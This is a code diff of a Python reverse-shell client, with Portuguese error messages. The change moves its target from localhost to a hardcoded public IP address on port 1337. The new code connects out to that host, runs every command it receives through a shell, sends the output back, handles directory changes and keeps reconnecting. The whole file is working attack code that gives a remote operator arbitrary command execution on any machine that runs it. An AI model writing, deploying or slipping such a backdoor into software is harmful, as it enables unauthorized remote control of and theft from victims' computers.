@@ -1,46 +1,63 @@
 import socket, subprocess, time, os
 
-def init_server():
-    
-    HOST = 'localhost'
-    PORT = 9992
+HOST = '24.199.96.46'
+PORT = 1337
 
+
+def cmd(client_socket: socket, data: str) -> None:
+    try:
+        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        response = output+error
+        client_socket.sendall(response)
+    except Exception as e:
+        print(f'Erro cmd(): {e}')
+
+
+def connect(HOST: str, PORT: int) -> socket:
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((HOST, PORT))
+        return client_socket
+    except Exception as e:
+        print(f'Erro connect(): {e}')
+        
+
+
+def cli(client_socket: socket) -> None:
     while True:
+
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
-            print("[*] Conectado ao handler")
+            raw = client_socket.recv(1024)
+            data = raw.decode().strip()
 
-            while True:
+            if not raw:
+                break
+            if data == "":
+                continue
+
+            elif data.startswith('cd '):
+                directory = data[3:].strip()
                 try:
-                    data = s.recv(4096)
-                    if not data:
-                        raise Exception("Conexão perdida")  # força pular pro except
-
-                    cmd = data.decode()
-
-                    if cmd.startswith('cd '):
-                        _dir = cmd[3:].strip()
-                        try:
-                            os.chdir(_dir)
-                        except:
-                            pass
-                        continue # aqui ele volta pro inicio do while
-
-
-                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    output, error = process.communicate()
-                    resposta = output + error
-                    s.sendall(resposta)
-
+                    os.chdir(directory)
                 except Exception as e:
-                    print(f"[!] Sessão encerrada: {e}")
-                    s.close()
-                    break  # volta ao loop externo e tenta reconectar
+                    print(f'Erro cli(): {e}')
+                continue
 
+            cmd(client_socket, data)
         except Exception as e:
-            print(f"[!] Erro ao conectar: {e}")
-            time.sleep(5)
+            print(f'Erro cli(): {e}')
+            break
 
 if __name__ == "__main__":
-    init_server()
+    while True:
+        try:
+            client = connect(HOST, PORT)
+        except Exception as e:
+            print(e)
+            break
+       
+        if client:
+            cli(client)
+        time.sleep(3)
+        
